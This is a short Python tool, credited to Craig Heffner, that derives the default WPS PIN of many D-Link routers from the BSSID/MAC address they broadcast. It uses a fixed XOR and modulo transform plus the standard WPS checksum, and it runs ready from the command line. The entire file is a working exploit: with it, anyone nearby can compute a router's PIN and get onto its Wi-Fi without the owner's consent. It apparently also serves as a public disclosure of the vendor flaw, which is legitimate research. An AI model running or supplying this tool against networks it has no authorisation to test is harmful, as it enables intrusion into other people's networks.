#!/usr/bin/env python
#
# Calculates the default WPS pin from the BSSID/MAC of many D-Link routers/APs.
#
# Craig Heffner
# Tactical Network Solutions

class WPSException(Exception):
    pass

class WPS(object):

    def checksum(self, pin):
        '''
        Standard WPS checksum algorithm.

        @pin - A 7 digit pin to calculate the checksum for.

        Returns the checksum value.
        '''
        accum = 0

        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)

        return ((10 - accum % 10) % 10)

class DLink(object):

    def __init__(self):
        self.wps = WPS()

    def __mac2nic(self, mac):
        '''
        Parses out the NIC portion of an ASCII MAC address.

        @mac_address - An ASCII string MAC address or NIC,
                       with or without delimiters.

        Returns the NIC portion of the MAC address as an int.
        '''
        mac = mac.replace(':', '').replace('-', '')

        if len(mac) == 12:
            try:
                nic = int(mac[6:], 16)
            except ValueError as e:
                raise WPSException("Invalid NIC: [%s]" % mac[6:])
        elif len(mac) == 6:
            try:
                nic = int(mac, 16)
            except ValueError as e:
                raise WPSException("Invalid NIC: [%s]" % mac)
        else:
            raise WPSException("Invalid MAC address: [%s]" % mac)

        return nic

    def generate(self, mac):
        '''
        Calculates the default WPS pin from the NIC portion of the MAC address.

        @mac - The MAC address string.

        Returns the calculated default WPS pin, including checksum.
        '''
        nic = self.__mac2nic(mac)

        # Do some XOR operations on the NIC
        pin = nic ^ 0x55AA55
        pin = pin ^ (((pin & 0x0F) << 4) +
                     ((pin & 0x0F) << 8) +
                     ((pin & 0x0F) << 12) +
                     ((pin & 0x0F) << 16) +
                     ((pin & 0x0F) << 20))

        # The largest possible remainder for any value divided by 10,000,000
        # is 9,999,999 (7 digits). The smallest possible remainder is, obviously, 0.
        pin = pin % int(10e6)

        # If the pin is less than 1,000,000 (i.e., less than 7 digits)
        if pin < int(10e5):
            # The largest possible remainder for any value divided by 9 is
            # 8; hence this adds at most 9,000,000 to the pin value, and at
            # least 1,000,000. This guarantees that the pin will be 7 digits
            # long, and also means that it won't start with a 0.
            pin += ((pin % 9) * int(10e5)) + int(10e5);

        # The final 8 digit pin is the 7 digit value just computed, plus a
        # checksum digit.
        return (pin * 10) + self.wps.checksum(pin)

if __name__ == '__main__':
    import sys

    try:
        mac = sys.argv[1]
    except IndexError:
        print ("Usage: %s <mac>" % sys.argv[0])
        sys.exit(1)

    try:
        print ("Default pin: %d" % DLink().generate(mac))
    except WPSException as e:
        print (str(e))
        sys.exit(1)


